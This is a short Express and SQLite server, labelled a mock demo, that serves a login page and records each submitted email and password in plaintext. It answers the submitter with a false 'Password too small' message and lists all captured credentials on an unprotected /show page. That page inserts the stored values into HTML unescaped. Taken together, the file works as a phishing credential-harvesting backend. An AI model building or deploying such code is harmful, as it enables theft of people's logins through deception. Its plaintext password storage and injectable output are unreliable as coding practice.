const express = require("express");
const bodyParser = require("body-parser");
const sqlite3 = require("sqlite3").verbose();
const path = require("path");

const app = express();
const port = 3000;

// === Setup SQLite database ===
const db = new sqlite3.Database("./mocklogins.db", (err) => {
  if (err) console.error("❌ Failed to connect to database:", err.message);
  else console.log("✅ Connected to SQLite database");
});

db.run(
  "CREATE TABLE IF NOT EXISTS logins (id INTEGER PRIMARY KEY AUTOINCREMENT, email TEXT, password TEXT)",
  (err) => {
    if (err) console.error("❌ Failed to create table:", err.message);
  }
);

// === Middleware ===
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, "public")));

// === Serve login form at root URL ===
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "login.html"));
});

// === Handle form submissions ===
app.post("/login", (req, res) => {
  const { email, password } = req.body;
  if (!email || !password) {
    return res.status(400).send("Missing credentials");
  }
  db.run(
    "INSERT INTO logins (email, password) VALUES (?, ?)",
    [email, password],
    function (err) {
      if (err) {
        console.error("❌ Error inserting:", err.message);
        return res.status(500).send("Something went wrong");
      }
      res.send("Password too small. This is a mock demo.");
    }
  );
});

// === View saved logins ===
app.get("/show", (req, res) => {
  db.all("SELECT * FROM logins", [], (err, rows) => {
    if (err) {
      console.error("❌ Error reading DB:", err.message);
      return res.status(500).send("Could not read data");
    }
    let html = "<h2>Saved Credentials (Demo)</h2><ul>";
    rows.forEach((row) => {
      html += `<li><b>Email:</b> ${row.email} | <b>Password:</b> ${row.password}</li>`;
    });
    html += "</ul>";
    res.send(html);
  });
});

// === Start the server ===
app.listen(port, () => {
  console.log(`🚀 Server running at http://localhost:${port}`);
});
